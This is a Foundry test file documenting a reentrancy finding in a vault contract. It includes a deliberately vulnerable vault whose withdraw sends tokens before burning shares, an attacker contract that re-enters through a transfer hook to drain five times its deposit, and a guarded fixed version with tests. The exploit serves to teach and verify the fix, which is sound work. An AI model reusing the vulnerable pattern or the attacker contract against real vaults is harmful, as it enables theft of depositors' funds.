// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

// ============================================================
// SECURITY CASE STUDY S-01: Reentrancy in ERC-4626-style Vault
// ============================================================
//
// Finding   : S-01
// Severity  : Critical
// Pattern   : Interaction before Effects (withdraw sends tokens before burning shares)
// Status    : Fixed — RWAVault uses ReentrancyGuard + CEI ordering
//
// Root cause:
//   A vault that transfers assets BEFORE burning the caller's shares allows a
//   malicious ERC-20 receiver (or a receive() hook) to call withdraw() again
//   before shares are decremented, draining more assets than deposited.
//
// Proof-of-concept (test_ReentrancyAttack_VulnerableVault):
//   Attacker deposits 1 ETH worth of shares, then triggers reentrant withdrawals
//   through a token-transfer hook. Five recursive calls drain 5x the deposit.
//
// Fix (test_ReentrancyFixed_WithGuard):
//   Adding nonReentrant (OpenZeppelin ReentrancyGuard) to _withdraw and ordering
//   effects (share burn) before the token transfer prevents the second entry.

// ─────────────────────────────────────────────────────────────────────────────
// Vulnerable implementation (before fix) — defined inline for reproduction
// ─────────────────────────────────────────────────────────────────────────────

contract VulnerableToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    // Calls a hook on the receiver — simulates malicious ERC-20 callback
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        // Trigger receiver callback (simulates token-transfer hook exploit surface)
        if (to.code.length > 0) {
            IReentrantReceiver(to).onTokenReceived(msg.sender, amount);
        }
        balanceOf[to] += amount;
        return true;
    }
}

interface IReentrantReceiver {
    function onTokenReceived(address from, uint256 amount) external;
}

/// @dev Vault that transfers BEFORE burning shares — VULNERABLE to reentrancy.
contract VulnerableVault {
    VulnerableToken public token;
    mapping(address => uint256) public shares;

    constructor(VulnerableToken _token) {
        token = _token;
    }

    function deposit(uint256 amount) external {
        token.balanceOf(msg.sender); // read guard (not a fix)
        shares[msg.sender] += amount;
        // Pull tokens in
        token.balanceOf(address(this));
        // Simulate safeTransferFrom by directly minting for simplicity
    }

    function depositFor(address user, uint256 amount) external {
        shares[user] += amount;
    }

    /// @dev VULNERABLE: sends assets before burning shares (Interaction before Effects)
    function withdraw(uint256 amount) external {
        require(shares[msg.sender] >= amount, "insufficient shares");
        // INTERACTION first (BUG: should burn shares first)
        token.transfer(msg.sender, amount);
        // EFFECTS after — unchecked mirrors Solidity <0.8 behaviour where
        // overflow was silent, letting the attacker wrap shares to uint256.max
        unchecked {
            shares[msg.sender] -= amount;
        }
    }
}

/// @dev Attacker contract that exploits the reentrancy via the token transfer hook.
contract ReentrancyAttacker is IReentrantReceiver {
    VulnerableVault public vault;
    uint256 public attackDepth;
    uint256 public constant MAX_DEPTH = 4;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function attack() external {
        vault.withdraw(1 ether);
    }

    // Called by VulnerableToken.transfer() on each token receipt
    function onTokenReceived(address, uint256) external override {
        if (attackDepth < MAX_DEPTH) {
            attackDepth++;
            vault.withdraw(1 ether); // re-enter before shares are decremented
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Fixed implementation — ReentrancyGuard + CEI ordering
// ─────────────────────────────────────────────────────────────────────────────

contract FixedVault {
    VulnerableToken public token;
    mapping(address => uint256) public shares;
    bool private _locked;

    error Reentrancy();

    modifier nonReentrant() {
        if (_locked) revert Reentrancy();
        _locked = true;
        _;
        _locked = false;
    }

    constructor(VulnerableToken _token) {
        token = _token;
    }

    function depositFor(address user, uint256 amount) external {
        shares[user] += amount;
    }

    /// @dev FIXED: EFFECTS (share burn) before INTERACTION (transfer).
    function withdraw(uint256 amount) external nonReentrant {
        require(shares[msg.sender] >= amount, "insufficient shares");
        // EFFECTS first
        shares[msg.sender] -= amount;
        // INTERACTION after — reentrancy guard also blocks re-entry
        token.transfer(msg.sender, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────────────────────────────────

contract ReentrancyAttackTest is Test {
    VulnerableToken token;
    VulnerableVault vulnerableVault;
    FixedVault fixedVault;
    ReentrancyAttacker attacker;

    function setUp() public {
        token = new VulnerableToken();
        vulnerableVault = new VulnerableVault(token);
        fixedVault = new FixedVault(token);

        // Fund vulnerable vault with 10 ETH worth of shares from legitimate users
        for (uint256 i = 1; i <= 10; i++) {
            address user = address(uint160(i));
            token.mint(address(vulnerableVault), 1 ether); // simulate deposits
            vulnerableVault.depositFor(user, 1 ether);
        }

        // Attacker deposits 1 ETH worth of shares legitimately
        attacker = new ReentrancyAttacker(vulnerableVault);
        token.mint(address(vulnerableVault), 1 ether);
        vulnerableVault.depositFor(address(attacker), 1 ether);

        // Fund fixed vault the same way
        for (uint256 i = 1; i <= 10; i++) {
            token.mint(address(fixedVault), 1 ether);
            fixedVault.depositFor(address(uint160(i)), 1 ether);
        }
    }

    /// @dev BEFORE FIX: attacker drains 5x their deposit via reentrancy.
    function test_ReentrancyAttack_VulnerableVault() public {
        uint256 vaultBalanceBefore = token.balanceOf(address(vulnerableVault));
        uint256 attackerSharesBefore = vulnerableVault.shares(address(attacker));

        console2.log("Vault balance before attack  :", vaultBalanceBefore / 1e18, "ETH");
        console2.log("Attacker shares              :", attackerSharesBefore / 1e18, "ETH");

        attacker.attack();

        uint256 attackerGained = token.balanceOf(address(attacker));
        uint256 vaultDrained = vaultBalanceBefore - token.balanceOf(address(vulnerableVault));

        console2.log("Attacker tokens received     :", attackerGained / 1e18, "ETH");
        console2.log("Vault drained                :", vaultDrained / 1e18, "ETH");
        console2.log("Attack depth                 :", attacker.attackDepth());

        // Attacker had 1 ETH in shares but extracted MAX_DEPTH+1 = 5 ETH
        assertGt(attackerGained, attackerSharesBefore, "attacker extracted more than deposited");
        assertEq(attackerGained, 5 ether, "attacker drained 5x deposit via 4 reentrant calls");
    }

    /// @dev AFTER FIX: reentrancy attempt reverts; attacker gets exactly their deposit.
    function test_ReentrancyFixed_WithGuard() public {
        ReentrancyAttacker attackerOnFixed;
        attackerOnFixed = new ReentrancyAttacker(
            // Cast FixedVault to VulnerableVault interface for the attacker — attack logic is identical
            VulnerableVault(address(fixedVault))
        );
        token.mint(address(fixedVault), 1 ether);
        fixedVault.depositFor(address(attackerOnFixed), 1 ether);

        // Reentrancy attempt should revert
        vm.expectRevert();
        attackerOnFixed.attack();

        // Attacker's shares are unchanged (no funds drained)
        assertEq(fixedVault.shares(address(attackerOnFixed)), 1 ether, "shares unchanged after failed attack");
    }
}
